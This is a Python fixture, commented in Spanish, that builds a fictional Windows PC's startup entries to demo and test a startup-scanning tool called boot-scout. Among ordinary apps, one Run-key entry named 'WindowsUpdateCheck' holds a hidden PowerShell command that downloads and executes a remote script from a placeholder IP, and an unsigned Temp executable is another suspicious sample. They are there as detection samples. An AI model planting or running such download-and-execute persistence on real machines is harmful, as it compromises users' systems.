"""Un ordenador de ejemplo, para probar boot-scout (y la ventana) sin tocar el tuyo.

Son entradas inventadas pero realistas (un PC de Windows normal, con lo típico: OneDrive,
Spotify, Steam, el actualizador de turno, un par de cosas de la marca del portátil y algún
resto roto). Pasan por el mismo juez que una pasada de verdad: el tipo, el veredicto y los
avisos los decide boot-scout, no están escritos aquí.
"""

from __future__ import annotations

from datetime import datetime, timedelta

from . import scan
from .entry import (
    AT_BOOT,
    AT_LOGON,
    SCHEDULED,
    Entry,
)
from .scan import Result

SYSTEM = "Windows"


def _e(**kw) -> Entry:
    kw.setdefault("when", AT_LOGON)
    kw.setdefault("scope", "usuario")
    return Entry(**kw)


def entries() -> list[Entry]:
    run = r"Software\Microsoft\Windows\CurrentVersion\Run"
    startup = r"C:\Users\Ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    return [
        _e(
            id="win:run:HKCU:Run:OneDrive",
            name="OneDrive",
            where="Registro: Run (tu usuario)",
            location=f"HKCU\\{run}\\OneDrive",
            command=r'"C:\Users\Ana\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background',
            path=r"C:\Users\Ana\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
            exists=True,
            company="Microsoft Corporation",
            signature="válida",
            signer="Microsoft Corporation",
        ),
        _e(
            id="win:run:HKCU:Run:Spotify",
            name="Spotify",
            where="Registro: Run (tu usuario)",
            location=f"HKCU\\{run}\\Spotify",
            command=r'"C:\Users\Ana\AppData\Roaming\Spotify\Spotify.exe" /minimized',
            path=r"C:\Users\Ana\AppData\Roaming\Spotify\Spotify.exe",
            exists=True,
            company="Spotify AB",
            signature="válida",
            signer="Spotify AB",
        ),
        _e(
            id="win:startup:usuario:Steam.lnk",
            name="Steam",
            where="Carpeta de Inicio (tu carpeta de Inicio)",
            location=f"{startup}\\Steam.lnk",
            command=r'"C:\Program Files (x86)\Steam\steam.exe" -silent',
            path=r"C:\Program Files (x86)\Steam\steam.exe",
            exists=True,
            company="Valve Corporation",
            signature="válida",
            signer="Valve Corp.",
            toggle={"kind": "startup-file", "file": f"{startup}\\Steam.lnk"},
        ),
        _e(
            id="win:run:HKCU:Run:Discord",
            name="Discord",
            where="Registro: Run (tu usuario)",
            location=f"HKCU\\{run}\\Discord",
            command=r"C:\Users\Ana\AppData\Local\Discord\Update.exe --processStart Discord.exe",
            path=r"C:\Users\Ana\AppData\Local\Discord\Update.exe",
            exists=True,
            company="Discord Inc.",
            signature="válida",
            signer="Discord Inc.",
        ),
        _e(
            id="win:run:HKLM:Run:SecurityHealth",
            name="SecurityHealth",
            where="Registro: Run (todo el equipo)",
            scope="sistema",
            location=r"HKLM\...\Run\SecurityHealth",
            command=r"%windir%\system32\SecurityHealthSystray.exe",
            path=r"C:\Windows\system32\SecurityHealthSystray.exe",
            exists=True,
            company="Microsoft Corporation",
            signature="válida",
            signer="Microsoft Windows",
        ),
        _e(
            id="win:run:HKLM:Run:RtkAudUService",
            name="RtkAudUService",
            where="Registro: Run (todo el equipo)",
            scope="sistema",
            location=r"HKLM\...\Run\RtkAudUService",
            command=r'"C:\Windows\System32\DriverStore\...\RtkAudUService64.exe" -background',
            path=r"C:\Windows\System32\RtkAudUService64.exe",
            exists=True,
            company="Realtek Semiconductor Corp.",
            signature="válida",
            signer="Realtek Semiconductor Corp",
        ),
        _e(
            id="win:service:NVDisplay.ContainerLocalSystem",
            name="NVIDIA Display Container",
            where="Servicio de Windows",
            scope="sistema",
            when=AT_BOOT,
            trigger="automático",
            location=r"HKLM\System\...\Services\NVDisplay.ContainerLocalSystem",
            command=r'"C:\Program Files\NVIDIA Corporation\Display.NvContainer\NVDisplay.Container.exe"',
            path=r"C:\Program Files\NVIDIA Corporation\Display.NvContainer\NVDisplay.Container.exe",
            exists=True,
            company="NVIDIA Corporation",
            signature="válida",
            signer="NVIDIA Corporation",
            hint="Para pararlo o cambiar su arranque: Servicios (services.msc). No toques los que no conozcas.",
        ),
        _e(
            id="win:task:Microsoft\\Office\\OfficeBackgroundTaskHandlerRegistration",
            name="OfficeBackgroundTaskHandlerRegistration",
            where="Tarea programada",
            scope="sistema",
            when=SCHEDULED,
            trigger="a una hora",
            location=r"C:\Windows\System32\Tasks\Microsoft\Office\...",
            command=r'"C:\Program Files\Microsoft Office\root\...\OfficeBackgroundTaskHandler.exe"',
            path=r"C:\Program Files\Microsoft Office\root\Office16\OfficeBackgroundTaskHandler.exe",
            exists=True,
            company="Microsoft Corporation",
            signature="válida",
            signer="Microsoft Corporation",
            extra={"author": "Microsoft Office", "microsoft": True},
        ),
        _e(
            id="win:task:GoogleUpdateTaskMachineUA",
            name="GoogleUpdateTaskMachineUA",
            where="Tarea programada",
            scope="sistema",
            when=SCHEDULED,
            trigger="cada día a las 06:12",
            location=r"C:\Windows\System32\Tasks\GoogleUpdateTaskMachineUA",
            command=r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua /installsource scheduler',
            path=r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
            exists=True,
            company="Google LLC",
            signature="válida",
            signer="Google LLC",
            extra={"author": "Google LLC"},
        ),
        _e(
            id="win:run:HKLM:Run:AnyDesk",
            name="AnyDesk",
            where="Registro: Run (todo el equipo)",
            scope="sistema",
            location=r"HKLM\...\Run\AnyDesk",
            command=r'"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --tray',
            path=r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
            exists=True,
            company="AnyDesk Software GmbH",
            signature="válida",
            signer="philandro Software GmbH",
        ),
        _e(
            id="win:run:HKCU:Run:utorrent",
            name="uTorrent",
            where="Registro: Run (tu usuario)",
            location=f"HKCU\\{run}\\uTorrent",
            command=r'"C:\Users\Ana\AppData\Roaming\uTorrent\uTorrent.exe" /MINIMIZED',
            path=r"C:\Users\Ana\AppData\Roaming\uTorrent\uTorrent.exe",
            exists=True,
            company="BitTorrent Inc.",
            signature="válida",
            signer="BitTorrent Inc.",
        ),
        _e(
            id="win:run:HKCU:Run:EpicGames",
            name="EpicGamesLauncher",
            where="Registro: Run (tu usuario)",
            enabled=False,
            command=r'"C:\Program Files (x86)\Epic Games\Launcher\...\EpicGamesLauncher.exe" -silent',
            location=f"HKCU\\{run}\\EpicGamesLauncher",
            path=r"C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win32\EpicGamesLauncher.exe",
            exists=True,
            company="Epic Games, Inc.",
            signature="válida",
            signer="Epic Games Inc.",
        ),
        _e(
            id="win:run:HKCU:Run:GoToMeeting",
            name="GoToMeeting",
            where="Registro: Run (tu usuario)",
            command=r'"C:\Users\Ana\AppData\Local\GoTo\gotomeeting.exe"',
            exists=False,
            path=r"C:\Users\Ana\AppData\Local\GoTo\gotomeeting.exe",
        ),
        _e(
            id="win:run:HKCU:Run:Updater7zXP",
            name="7zXP-update",
            where="Registro: Run (tu usuario)",
            command=r"C:\Users\Ana\AppData\Local\Temp\7zXP1a\svc.exe -run",
            exists=True,
            path=r"C:\Users\Ana\AppData\Local\Temp\7zXP1a\svc.exe",
            signature="sin firma",
        ),
        # Lo de siempre de un virus que se disfraza: el programa es PowerShell, de Windows y
        # firmado por Microsoft, pero arranca oculto y se baja algo de internet cada vez.
        _e(
            id="win:run:HKCU:Run:WindowsUpdateCheck",
            name="WindowsUpdateCheck",
            where="Registro: Run (tu usuario)",
            command=r"powershell.exe -w hidden -ep bypass -c iex(iwr http://198.51.100.7/u.ps1 -UseBasicParsing)",
            inline="iex(iwr http://198.51.100.7/u.ps1 -UseBasicParsing)",
            exists=True,
            path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            signature="válida",
            signer="Microsoft Windows",
            company="Microsoft Corporation",
        ),
        _e(
            id="win:run:HKCU:Run:HappyThing",
            name="HappyThing",
            where="Registro: Run (tu usuario)",
            command=r'"C:\Program Files\HappyThing\happy.exe" /autostart',
            exists=True,
            path=r"C:\Program Files\HappyThing\happy.exe",
            signature="válida",
            signer="Happy Software Ltd",
            company="Happy Software Ltd",
        ),
    ]


def result(now: datetime | None = None) -> Result:
    now = now or datetime.now()
    found = scan.classify(entries())
    earlier = (now - timedelta(days=52)).isoformat(timespec="seconds")
    for entry in found:
        entry.first_seen = earlier
        if entry.id == "win:run:HKCU:Run:HappyThing":  # lo que apareció desde la última vez
            entry.is_new = True
            entry.first_seen = now.isoformat(timespec="seconds")
    res = Result(system=SYSTEM, started=now.isoformat(timespec="seconds"), seconds=3.4, entries=found)
    res.gone = [
        {
            "id": "win:run:HKCU:Run:CCleaner",
            "name": "CCleaner",
            "where": "Registro: Run (tu usuario)",
            "verdict": "Puedes quitarlo",
            "last_seen": (now - timedelta(days=6)).isoformat(timespec="seconds"),
        }
    ]
    return res
